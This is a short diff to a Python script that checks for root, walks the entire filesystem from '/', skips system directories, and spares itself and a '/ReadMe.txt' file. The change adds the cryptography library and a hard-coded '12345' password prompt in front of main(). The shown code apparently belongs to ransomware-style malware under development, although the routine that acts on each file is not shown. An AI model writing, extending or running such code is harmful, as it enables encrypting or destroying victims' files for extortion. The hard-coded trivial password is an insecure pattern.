@@ -1,9 +1,10 @@
 import os
 import sys
-import subprocess
+import cryptography
 self = sys.argv[0]
-dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/tmp', '/usr', '/var']
-excludedFiles = [self, "/bin/cat", "/bin/echo"]
+passKey = "12345"
+dirIgnoreList = ['/bin', '/boot', '/dev', '/etc', '/lib', '/proc', '/run', '/sbin', '/sys', '/usr/lib', '/usr/lib64', '/usr/libexec']
+excludedFiles = [self, "/ReadMe.txt"]
 origin = "/"
 def main():
     fileList = findFiles(origin)
@@ -39,5 +40,13 @@ def _norm_path(p):
             return os.path.realpath(os.path.abspath(p))
         except Exception:
             return os.path.abspath(p)
+def checkPass():
+    userPass = input("Enter Password: ")
+    if(userPass == passKey):
+        return True
+    else:
+        print("Incorrect Password")
+        return False
 if(os.getuid() == 0):
-    main()
+    if(checkPass()):
+        main()
